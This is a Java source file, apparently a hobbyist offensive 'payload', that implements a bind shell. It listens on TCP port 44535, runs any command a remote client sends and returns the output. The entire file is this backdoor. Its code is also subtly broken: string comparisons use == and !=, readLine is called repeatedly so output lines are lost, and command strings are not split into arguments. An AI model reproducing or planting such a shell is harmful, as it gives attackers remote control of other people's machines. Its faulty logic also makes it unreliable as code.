import java.io.*;
import java.net.*;

public class payload{
    public static void main(String[] args){        
        int port=44535;
        try{
        ServerSocket listener=new ServerSocket(port);
        System.out.println("connecting to r0ach_");
        Socket s=listener.accept();
        DataInputStream data_input= new DataInputStream(s.getInputStream());    
        DataOutputStream data_output=new DataOutputStream(s.getOutputStream());
        String msg="";
        while(msg!="/exit"){
        msg=(String)data_input.readUTF();
        System.out.println("[r0ch_shell:]>> activating shell..:...");
        System.out.println("[r0ch_shell:]>> "+msg);
        //Process process = Runtime.getRuntime().exec(msg);
        if(msg=="s/exit"){break;}
        Process process= new ProcessBuilder(msg).start();
        BufferedReader reader=new BufferedReader(new InputStreamReader(process.getInputStream()));
        String cmd_rep="";
        while(reader.readLine()!=null){      
          cmd_rep+=reader.readLine();
          cmd_rep+="\n"; 
          System.out.println(reader.readLine());
          data_output.writeUTF(cmd_rep);   
         }
         System.out.println("-----------------------------------------------");
         System.out.println(cmd_rep);
        }
        data_output.flush();         
        listener.close();
        }catch(Exception e){
            System.out.println(e);
        }
    }     
}
